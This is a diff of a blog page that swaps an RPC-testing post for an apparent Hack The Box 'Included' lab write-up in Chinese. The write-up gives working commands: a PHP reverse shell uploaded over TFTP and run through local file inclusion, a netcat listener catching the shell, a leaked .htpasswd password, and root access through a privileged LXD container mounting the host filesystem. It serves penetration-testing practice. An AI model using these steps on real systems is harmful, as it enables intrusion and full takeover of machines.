@@ -8,7 +8,7 @@
   name="viewport"
   content="width=device-width, initial-scale=1, shrink-to-fit=no"
 /><title>
-  RPC端口测试 | L
+  htb-Included | L
 </title>
 <meta name="description" content="少女祈祷中..."/><script>
   window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://test692618.github.io/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"English\",\"Locale\":\"\"},{\"Lang\":\"ja\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"日本語\",\"Locale\":\"\"},{\"Lang\":\"zh-cn\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"简体中文\",\"Locale\":\"zh-cn\"},{\"Lang\":\"zh-tw\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"繁體中文\",\"Locale\":\"\"}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
@@ -33,20 +33,20 @@
     type="font/woff2"
     crossorigin="anonymous"
   /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" /><meta property="og:type" content="website" />
-  <meta property="og:title" content="RPC端口测试 | L" />
+  <meta property="og:title" content="htb-Included | L" />
   <meta
     property="og:description"
     content="少女祈祷中..."
   />
-  <meta property="og:url" content="https://test692618.github.io/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/rpc%E7%AB%AF%E5%8F%A3%E6%B5%8B%E8%AF%95/" />
+  <meta property="og:url" content="https://test692618.github.io/post/htb/htb%E6%89%93%E9%9D%B6-included/" />
   <meta
     property="og:site_name"
     content="HELLO WORLD"
   />
   <meta property="og:image" content="https://test692618.github.io/images/banner.webp" />
   <meta property="article:author" content="L" />
-  <meta property="article:published_time" content="2024-01-28T17:54:19&#43;00:00" />
-  <meta property="article:modified_time" content="2024-01-28T17:54:19&#43;00:00" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" />
+  <meta property="article:published_time" content="2026-03-29T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2026-03-29T00:00:00&#43;00:00" /><meta property="article:tag" content="htb" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" />
 <link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.3cb430561af988141327a9e105860d0e1d0f240a915b0c600564590371ef51c3.css" /><link
     rel="preload"
     as="style"
@@ -170,9 +170,9 @@
         });
       </script>
     </nav></div>
-<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="RPC端口测试"><div id="header-outer">
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="htb-Included"><div id="header-outer">
     <div id="header-title"><span id="logo">
-            <h1 data-aos="slide-up">RPC端口测试</h1>
+            <h1 data-aos="slide-up">htb-Included</h1>
           </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
   </div>
 </header><div id="content"
@@ -184,7 +184,15 @@
       data-aos="fade-up"
     ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class">
-  <nav id="TableOfContents"></nav>
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#端口枚举">端口枚举</a></li>
+    <li><a href="#web测试">web测试</a></li>
+    <li><a href="#拿到低权限shell">拿到低权限shell</a></li>
+    <li><a href="#权限提升">权限提升</a></li>
+    <li><a href="#利用lxd配置不当普通用户加入lxd组进行权限提升">利用LXD配置不当（普通用户加入lxd组）进行权限提升</a></li>
+  </ul>
+</nav>
 </div></div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
   <img
@@ -262,29 +270,169 @@
     class="article-date-link icon-calendar"
     data-aos="zoom-in"
   >
-    <time datetime="2024-01-28 17:54:19 &#43;0000 UTC" itemprop="datePublished"
-      >2024-01-28</time
+    <time datetime="2026-03-29 00:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >2026-03-29</time
     >
     <time style="display: none;" id="post-update-time"
-      >2024-01-28</time
+      >2026-03-29</time
     >
   </span></div>
-</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><p>在kali中 默认有 rpcclient 工具 ，去连接RPC服务。</p>
-<p><img src="./../../images/image-20230820155432724.png" alt="image-20230820155432724"></p>
-<p>也可以使用python中impacket类库中的 rpcdump.py工具</p>
-<p><img src="./../../images/image-20230820160138727.png" alt="image-20230820160138727"></p>
-<p><img src="./../../images/image-20230820160222255.png" alt="image-20230820160222255"></p>
-<p>当然，你要想直接使用它，要么添加一台环境变量，要么进到对应目录下</p>
-</div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="端口枚举">
+<a class="header-anchor" href="#%e7%ab%af%e5%8f%a3%e6%9e%9a%e4%b8%be"></a>
+端口枚举
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">//TCP端口仅开放80端口，UDP端口开放69端口-tftp
+</span></span><span class="line"><span class="cl">//TCP扫描
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//UDP扫描，UDP这里扫描不稳定，未能发现tftp端口，但实际通过tftp客户端是可以直接访问到的。
+</span></span><span class="line"><span class="cl">PORT    STATE  SERVICE
+</span></span><span class="line"><span class="cl">17/udp  closed qotd
+</span></span><span class="line"><span class="cl">26/udp  closed unknown
+</span></span><span class="line"><span class="cl">292/udp closed unknown
+</span></span><span class="line"><span class="cl">339/udp closed unknown
+</span></span><span class="line"><span class="cl">353/udp closed ndsauth
+</span></span><span class="line"><span class="cl">374/udp closed legent-2
+</span></span><span class="line"><span class="cl">413/udp closed smsp
+</span></span><span class="line"><span class="cl">486/udp closed avian
+</span></span></code></pre></div><h2 id="web测试">
+<a class="header-anchor" href="#web%e6%b5%8b%e8%af%95"></a>
+web测试
+</h2><p>发现文件包含漏洞，并且经测试为本地文件包含。</p>
+<p><img src="./../images/image-20260329142844439.png" alt="image-20260329142844439"></p>
+<h2 id="拿到低权限shell">
+<a class="header-anchor" href="#%e6%8b%bf%e5%88%b0%e4%bd%8e%e6%9d%83%e9%99%90shell"></a>
+拿到低权限shell
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">//tftp协议特点：1.udp传输。2.无身份验证。3.不支持目录读取。4.仅支持读写操作。该服务默认目录通过上图的/etc/passwd信息，可以看到为/var/lib/tftpboot。
+</span></span><span class="line"><span class="cl">//思路：通过tftp上传webshell，再利用文件包含漏洞执行。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//step.1 使用kali自带的php-webshell，修改IP和端口，所在目录为:/usr/share/webshells/php/php-reverse-shell.php
+</span></span><span class="line"><span class="cl">//step.2 通过tftp上传。
+</span></span><span class="line"><span class="cl">	─$ tftp 10.129.95.185
+</span></span><span class="line"><span class="cl">	tftp&gt; put php-reverse-shell.php
+</span></span><span class="line"><span class="cl">	tftp&gt; quit
+</span></span><span class="line"><span class="cl">//step.3 做好端口监听并执行
+</span></span><span class="line"><span class="cl">web执行路径：http://10.129.95.185/?file<span class="o">=</span>../../../../../../var/lib/tftpboot/php-reverse-shell.php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    └─$ rlwrap  nc -lvvp <span class="m">1234</span> 
+</span></span><span class="line"><span class="cl">    listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">    10.129.95.185: inverse host lookup failed: Unknown host
+</span></span><span class="line"><span class="cl">    connect to <span class="o">[</span>10.10.16.65<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.95.185<span class="o">]</span> <span class="m">60170</span>
+</span></span><span class="line"><span class="cl">    Linux included 4.15.0-151-generic <span class="c1">#157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class="line"><span class="cl">     06:43:38 up <span class="m">23</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.00, 0.00
+</span></span><span class="line"><span class="cl">    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class="line"><span class="cl">    <span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    /bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">    $ 
+</span></span></code></pre></div><h2 id="权限提升">
+<a class="header-anchor" href="#%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87"></a>
+权限提升
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">//在/var/www/html，即网站所部署的路径发现.htpasswd文件，内容包含账户密码。
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">//科普-.htpasswd文件是什么：.htpasswd文件，意味着该网站目录或其下的某个子目录启用了 Apache HTTP 服务器的基本身份验证（Basic Authentication）。.htpasswd文件与 .htaccess文件配合工作，用于限制对特定网站目录的访问。当用户尝试访问被保护的页面时，浏览器会弹出一个登录框，要求输入用户名和密码。通常情况下会对.htpasswd的密码进行加密。
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> /var/www/html
+</span></span><span class="line"><span class="cl">$ ls
+</span></span><span class="line"><span class="cl">default.css
+</span></span><span class="line"><span class="cl">fonts
+</span></span><span class="line"><span class="cl">fonts.css
+</span></span><span class="line"><span class="cl">home.php
+</span></span><span class="line"><span class="cl">images
+</span></span><span class="line"><span class="cl">index.php
+</span></span><span class="line"><span class="cl">license.txt
+</span></span><span class="line"><span class="cl">$ ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">88</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root     root      <span class="m">4096</span> Oct <span class="m">13</span>  <span class="m">2021</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root     root      <span class="m">4096</span> Apr <span class="m">23</span>  <span class="m">2021</span> ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data   <span class="m">212</span> Apr <span class="m">23</span>  <span class="m">2021</span> .htaccess
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data    <span class="m">17</span> Apr <span class="m">23</span>  <span class="m">2021</span> .htpasswd
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data <span class="m">13828</span> Apr <span class="m">29</span>  <span class="m">2014</span> default.css
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> www-data www-data  <span class="m">4096</span> Apr <span class="m">23</span>  <span class="m">2021</span> fonts
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data <span class="m">20448</span> Apr <span class="m">29</span>  <span class="m">2014</span> fonts.css
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data  <span class="m">3704</span> Oct <span class="m">13</span>  <span class="m">2021</span> home.php
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> www-data www-data  <span class="m">4096</span> Apr <span class="m">23</span>  <span class="m">2021</span> images
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data   <span class="m">145</span> Oct <span class="m">13</span>  <span class="m">2021</span> index.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data <span class="m">17187</span> Apr <span class="m">29</span>  <span class="m">2014</span> license.txt
+</span></span><span class="line"><span class="cl">$ cat .htpasswd
+</span></span><span class="line"><span class="cl">mike:Sheffield19  //发现账户密码文件
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">//切到mike账户
+</span></span><span class="line"><span class="cl">$ su - mike
+</span></span><span class="line"><span class="cl">su: must be run from a terminal  //发现问题，这个错误是因为 su命令需要在真实的终端（TTY）中运行，而你当前的环境可能是一个非交互式会话（如通过 SSH 执行单条命令、Web Shell、某些脚本环境等）。
+</span></span><span class="line"><span class="cl">$ tty
+</span></span><span class="line"><span class="cl">not a tty
+</span></span><span class="line"><span class="cl">$ script -q -c <span class="s2">&#34;su mike&#34;</span> /dev/null  //使用该命令即可
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">//这是使用 script命令创建伪终端的方法，更轻量级。
+</span></span><span class="line"><span class="cl">分解说明：
+</span></span><span class="line"><span class="cl">    script：一个用于记录终端会话的命令，它会自动创建一个伪终端。
+</span></span><span class="line"><span class="cl">    -q：安静模式，不显示 script自己的启动和结束信息。
+</span></span><span class="line"><span class="cl">    -c <span class="s2">&#34;su mike&#34;</span>：在伪终端中执行指定的命令（su mike）。
+</span></span><span class="line"><span class="cl">    /dev/null：将终端会话记录输出到空设备（即丢弃记录）。这是为了不生成多余的日志文
+</span></span><span class="line"><span class="cl">		//或者使用python提升为交互式会话，但目标机器上没有python环境。
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">Password: Sheffield19
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mike@included:/var/www/html$ 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//注意到该账户在lxd组。LXD 是一个基于 LXC 容器技术的系统级容器与虚拟机管理平台。简单说LXD是一个类似docker的容器。用户在lxd组说明，存在lxd程序。在渗透测试中，配置不当的 LXD（尤其是将用户加入了 lxd组）可能导致权限提升漏洞，因为容器默认可以挂载主机文件系统，从而获得 root 权限。这是安全评估时需要关注的一个点。
+</span></span><span class="line"><span class="cl">//思路：创建一个容器，将目录目标机器的目录挂载到容器中。
+</span></span><span class="line"><span class="cl">mike@included:/var/www/html$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>mike<span class="o">)</span>,108<span class="o">(</span>lxd<span class="o">)</span>
+</span></span></code></pre></div><h2 id="利用lxd配置不当普通用户加入lxd组进行权限提升">
+<a class="header-anchor" href="#%e5%88%a9%e7%94%a8lxd%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e6%99%ae%e9%80%9a%e7%94%a8%e6%88%b7%e5%8a%a0%e5%85%a5lxd%e7%bb%84%e8%bf%9b%e8%a1%8c%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87"></a>
+利用LXD配置不当（普通用户加入lxd组）进行权限提升
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">//step.1 下载镜像
+</span></span><span class="line"><span class="cl">	git clone https://github.com/saghul/lxd-alpine-builder
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">//step.2 上传至目标机器
+</span></span><span class="line"><span class="cl">	由于靶机环境不通github，这里我是下载到本机，然后通过<span class="s1">&#39;python -m http.server 80&#39;</span> 和<span class="s1">&#39;wget命令&#39;</span> 进行传输。注意目标机器切换至/tmp目录下，以防止权限不足。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//step.3 将镜像文件导入到 LXD 的本地镜像存储中。
+</span></span><span class="line"><span class="cl">    lxc image import ./alpine*.tar.gz --alias <span class="nb">test</span>  
+</span></span><span class="line"><span class="cl">    	//--alias test的意思是为镜像命名。
+</span></span><span class="line"><span class="cl">//step.4 创建特权容器。使用别名 test镜像，创建一个名为 rongqi的新容器
+</span></span><span class="line"><span class="cl">	lxc init <span class="nb">test</span> rongqi -c security.privileged<span class="o">=</span><span class="nb">true</span> 
+</span></span><span class="line"><span class="cl">		//-c security.privileged<span class="o">=</span><span class="nb">true</span> 这是关键且危险的配置。它意味着容器内的 root 用户将拥有与宿主机 root 用户几乎相同的权限。容器内的 root 可以操作主机内核的许多特性，这严重削弱了容器的隔离性，仅应在完全信任容器内操作或进行特定调试时使用。
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">//step.5 挂载主机目录至容器
+</span></span><span class="line"><span class="cl">	lxc config device add rongqi guazai disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl">		//disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span> ：将宿主机的根目录（source<span class="o">=</span>/）挂载到容器内的 /mnt/root路径下。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//step.6 启动并进入容器
+</span></span><span class="line"><span class="cl">	lxc start rongqi //启动
+</span></span><span class="line"><span class="cl">	 lxc <span class="nb">exec</span> rongqi -- /bin/sh  //进入
+</span></span><span class="line"><span class="cl">	 
+</span></span><span class="line"><span class="cl">最后切换至/mnt/root/root目录下即可发现root.txt文件，另外一个user.txt在/home/mike的目录下.
+</span></span><span class="line"><span class="cl">----------------------------------------------------------
+</span></span><span class="line"><span class="cl">//实操时，发生一些问题，一开始是将根目录挂载至容器的/mnt/root目录下，但访问不到flag文件。试了挺久也不行，最后进行了以下修改：将root目录挂载至容器的/mnt/flag目录下。毕竟目的只是为了root.txt
+</span></span><span class="line"><span class="cl">//lxc config device add rongqi guazai2 disk <span class="nv">source</span><span class="o">=</span>/root <span class="nv">path</span><span class="o">=</span>/mnt/flag <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//另外一些补充命令：
+</span></span><span class="line"><span class="cl">//  查看容器状态：lxc list
+</span></span><span class="line"><span class="cl">//  启动和关闭容器：lxc start rongqi 
+</span></span><span class="line"><span class="cl">				 lxc stop rongqi
+</span></span><span class="line"><span class="cl">// 	删除容器：lxc delete -f <span class="o">[</span>容器名<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//备注：hacktrick中也有详细操作过程可参考	
+</span></span></code></pre></div></div>
     <footer class="article-footer"><ul class="article-category-list"><li class="article-tag-list-item" data-aos="zoom-in">
     <a
       class="article-category-link"
-      href="/categories/%e6%b8%97%e9%80%8f%e6%8a%80%e5%b7%a7"
+      href="/categories/htb"
       data-aos="zoom-in"
-      >渗透技巧</a
+      >HTB</a
     >
     </li></ul>
-<ul class="article-tag-list" itemprop="keywords"></ul>
+<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/htb"
+        rel="tag"
+        >htb</a
+      >
+    </li></ul>
 </footer>
   </div><nav
     id="article-nav"
@@ -293,27 +441,15 @@
   ><div class="article-nav-link-wrap left"><img
               data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
               data-sizes="auto"
-              alt="将靶机执行结果传回至本机"
+              alt="htb-Unified"
               class="lazyload"
             /><a
-          href="/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/%E5%B0%86%E9%9D%B6%E6%9C%BA%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%BC%A0%E5%9B%9E%E8%87%B3%E6%9C%AC%E6%9C%BA/"
-          aria-label="前一篇:将靶机执行结果传回至本机"
-          title="前一篇:将靶机执行结果传回至本机"
+          href="/post/htb/htb%E6%89%93%E9%9D%B6-unified/"
+          aria-label="前一篇:htb-Unified"
+          title="前一篇:htb-Unified"
         ></a>
         <div class="article-nav-caption">前一篇</div>
-        <h3 class="article-nav-title">将靶机执行结果传回至本机</h3>
-      </div><div class="article-nav-link-wrap right"><img
-              data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
-              data-sizes="auto"
-              alt="FTP端口测试"
-              class="lazyload"
-            /><a
-          href="/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/ftp%E7%AB%AF%E5%8F%A3%E6%B5%8B%E8%AF%95/"
-          aria-label="后一篇:FTP端口测试"
-          title="后一篇:FTP端口测试"
-        ></a>
-        <div class="article-nav-caption">后一篇</div>
-        <h3 class="article-nav-title">FTP端口测试</h3>
+        <h3 class="article-nav-title">htb-Unified</h3>
       </div></nav></article></section>
         </div><footer id="footer" aria-label="Site footer">
   <div style="width: 100%; overflow: hidden">
@@ -362,7 +498,15 @@
       </div><nav id="mobile-nav" aria-label="Mobile navigation">
   <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class">
-  <nav id="TableOfContents"></nav>
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#端口枚举">端口枚举</a></li>
+    <li><a href="#web测试">web测试</a></li>
+    <li><a href="#拿到低权限shell">拿到低权限shell</a></li>
+    <li><a href="#权限提升">权限提升</a></li>
+    <li><a href="#利用lxd配置不当普通用户加入lxd组进行权限提升">利用LXD配置不当（普通用户加入lxd组）进行权限提升</a></li>
+  </ul>
+</nav>
 </div></div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
   <img
@@ -474,9 +618,9 @@
   <div><script data-pjax>
         window.REIMU_POST = {
           author: "L",
-          title: "RPC端口测试",
-          url: "https:\/\/test692618.github.io\/post\/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7\/rpc%E7%AB%AF%E5%8F%A3%E6%B5%8B%E8%AF%95\/",
-          description: "在kali中 默认有 rpcclient 工具 ，去连接RPC服务。\n也可以使用python中impacket类库中的 rpcdump.py工具\n当然，你要想直接使用它，要么添加一台环境变量，要么进到对应目录下\n",
+          title: "htb-Included",
+          url: "https:\/\/test692618.github.io\/post\/htb\/htb%E6%89%93%E9%9D%B6-included\/",
+          description: " 端口枚举 \/\/TCP端口仅开放80端口，UDP端口开放69端口-tftp \/\/TCP扫描 PORT STATE SERVICE 80\/tcp open http \/\/UDP扫描，UDP这里扫描不稳定，未能发现tftp端口，但实际通过tftp客户端是可以直接访问到的。 PORT STATE SERVICE 17\/udp closed qotd 26\/udp closed unknown 292\/udp closed unknown 339\/udp closed unknown 353\/udp closed ndsauth 374\/udp closed legent-2 413\/udp …",
           cover: "https:\/\/test692618.github.io\/images\/banner.webp",
         };
       </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax ></script><script src="/js/tabs.js" integrity="" crossorigin="anonymous" data-pjax defer></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
